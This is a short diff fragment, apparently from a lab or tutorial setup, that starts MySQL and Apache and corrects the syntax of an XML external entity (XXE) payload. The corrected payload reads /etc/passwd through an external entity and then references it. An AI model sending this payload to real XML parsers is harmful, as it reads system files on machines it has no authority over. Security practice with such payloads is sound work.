@@ -30,7 +30,7 @@ sudo su
 systemctl start MySQL
 systemctl start apache2
 
-<!DOCTYPE test \[ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 
 &xxe;
 
